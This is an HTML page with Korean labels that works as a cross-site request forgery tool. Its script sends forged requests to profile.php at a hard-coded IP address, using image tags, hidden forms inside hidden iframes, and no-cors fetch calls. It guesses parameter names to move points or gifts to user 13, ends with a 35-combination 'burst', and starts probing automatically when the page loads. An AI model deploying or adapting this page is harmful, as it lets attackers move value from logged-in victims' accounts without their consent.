<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>🔍 응답 분석 도구</title>
    <style>
        body { 
            font-family: Arial; 
            padding: 15px;
            background: #000;
            color: #0f0;
            font-size: 14px;
        }
        .analysis {
            background: #111;
            border: 1px solid #0f0;
            padding: 15px;
            margin: 10px 0;
            border-radius: 5px;
        }
        button {
            background: #0f0;
            color: #000;
            border: none;
            padding: 10px 15px;
            border-radius: 3px;
            cursor: pointer;
            margin: 5px;
            font-weight: bold;
        }
        .critical { background: #ff0000; color: white; }
    </style>
</head>
<body>
    <h1>🔍 실시간 응답 분석</h1>
    
    <div class="analysis">
        <h2>📊 현재 상황 분석</h2>
        <p>✅ GET 공격들이 실행되고 있음</p>
        <p>⚡ Mixed Content 경고 = 요청 전송 중</p>
        <p>🎯 이제 **네트워크 탭**에서 응답 코드 확인 필요</p>
    </div>

    <div class="analysis">
        <h2>🎯 다음 단계</h2>
        <button onclick="checkResponses()">📡 응답 코드 체크</button>
        <button onclick="precisionAttack()">🎯 정밀 공격</button>
        <button class="critical" onclick="finalBurst()">💥 최종 집중 공격</button>
    </div>

    <div class="analysis">
        <h2>🔍 찾아야 할 신호들</h2>
        <ul>
            <li>🟢 <strong>200 OK</strong> - 성공 신호!</li>
            <li>🟡 <strong>다른 302 Location</strong> - 새로운 경로</li>
            <li>🔵 <strong>4xx가 아닌 다른 에러</strong> - 처리되고 있음</li>
            <li>⚪ <strong>응답 시간 차이</strong> - 서버가 처리 중</li>
        </ul>
    </div>

    <div id="result"></div>

    <script>
        function checkResponses() {
            showResult('📡 응답 패턴 분석 중...');
            
            // 응답 시간 측정을 위한 정밀 공격
            const testUrls = [
                'http://3.36.66.216/profile.php?receiver_id=13&points=1',
                'http://3.36.66.216/profile.php?to=13&amount=1', 
                'http://3.36.66.216/profile.php?user_id=13&coins=1',
                'http://3.36.66.216/profile.php?target=13&value=1'
            ];
            
            testUrls.forEach((url, i) => {
                setTimeout(() => {
                    const start = Date.now();
                    const img = new Image();
                    
                    img.onload = () => {
                        const time = Date.now() - start;
                        console.log(`✅ URL ${i+1} 로드 성공! 응답시간: ${time}ms`);
                    };
                    
                    img.onerror = () => {
                        const time = Date.now() - start;
                        console.log(`⚠️ URL ${i+1} 에러 (정상), 응답시간: ${time}ms`);
                    };
                    
                    img.src = url + '&t=' + Date.now();
                    console.log(`🔍 테스트 ${i+1}: ${url.split('?')[1]}`);
                }, i * 500);
            });
        }
        
        function precisionAttack() {
            showResult('🎯 정밀 타겟팅 공격...');
            
            // 가장 성공 가능성이 높은 조합들
            const precisionTargets = [
                // 1. 표준 필드명
                'receiver_id=13&points=50&send_gift=1&gift_type=diamond',
                
                // 2. 단순화된 필드  
                'to=13&amount=50&send=1',
                
                // 3. 일반적인 전송 형태
                'user_id=13&transfer=50&action=send',
                
                // 4. 포인트 시스템 추정
                'target_user=13&point_amount=50&operation=transfer',
                
                // 5. 선물 시스템 추정
                'recipient=13&gift_points=50&do_send=true'
            ];
            
            precisionTargets.forEach((params, i) => {
                setTimeout(() => {
                    // 여러 방법으로 동시 시도
                    
                    // 방법 1: Image
                    const img = new Image();
                    img.src = `http://3.36.66.216/profile.php?${params}&method=img`;
                    
                    // 방법 2: 숨겨진 Form
                    const form = document.createElement('form');
                    form.method = 'GET';
                    form.action = 'http://3.36.66.216/profile.php';
                    form.target = `result_${i}`;
                    form.style.display = 'none';
                    
                    params.split('&').forEach(param => {
                        const [key, value] = param.split('=');
                        const input = document.createElement('input');
                        input.name = key;
                        input.value = value;
                        form.appendChild(input);
                    });
                    
                    // 추가 메타데이터
                    const meta = document.createElement('input');
                    meta.name = 'precision_attack';
                    meta.value = i + 1;
                    form.appendChild(meta);
                    
                    document.body.appendChild(form);
                    
                    // iframe 생성
                    const iframe = document.createElement('iframe');
                    iframe.name = `result_${i}`;
                    iframe.style.display = 'none';
                    document.body.appendChild(iframe);
                    
                    form.submit();
                    
                    console.log(`🎯 정밀공격 ${i+1}: ${params}`);
                }, i * 300);
            });
        }
        
        function finalBurst() {
            showResult('💥 최종 집중 공격 개시!');
            
            // 모든 가능한 조합으로 폭격
            const amounts = [1, 5, 10, 25, 50, 75, 100];
            const fieldSets = [
                ['receiver_id', 'points', 'send_gift'],
                ['to', 'amount', 'send'],
                ['user_id', 'coins', 'transfer'],
                ['target', 'value', 'action'],
                ['recipient', 'gift_points', 'do_send']
            ];
            
            let attackCount = 0;
            
            fieldSets.forEach((fields, setIndex) => {
                amounts.forEach((amount, amountIndex) => {
                    setTimeout(() => {
                        attackCount++;
                        
                        let url = 'http://3.36.66.216/profile.php?';
                        url += `${fields[0]}=13`;
                        url += `&${fields[1]}=${amount}`;
                        url += `&${fields[2]}=1`;
                        url += `&burst_attack=${attackCount}`;
                        url += `&timestamp=${Date.now()}`;
                        
                        // 동시에 여러 방법으로
                        const img = new Image();
                        img.src = url;
                        
                        // fetch도 시도 (CORS 에러 무시)
                        fetch(url, {mode: 'no-cors'}).catch(() => {});
                        
                        console.log(`💥 BURST ${attackCount}: ${fields[0]}=13, ${fields[1]}=${amount}`);
                        
                    }, (setIndex * amounts.length + amountIndex) * 100);
                });
            });
            
            showResult(`💥 최종 집중 공격 진행 중!
            
총 ${fieldSets.length * amounts.length}개 조합 공격:
- 5가지 필드명 세트
- 7가지 포인트 값  
- 이미지 + fetch 동시 실행
- 100ms 간격 연속 공격

네트워크 탭에서 **어떤 요청이 다른 응답**을 받는지 확인하세요!`);
        }
        
        function showResult(text) {
            document.getElementById('result').innerHTML = 
                '<div class="analysis"><pre style="color: #ff0;">' + text + '</pre></div>';
        }
        
        // 자동으로 체크 시작
        setTimeout(checkResponses, 2000);
        
        console.log('🔍 응답 분석 도구 준비됨');
        console.log('📊 네트워크 탭에서 200 OK 또는 다른 패턴을 찾으세요!');
    </script>
</body>
</html>
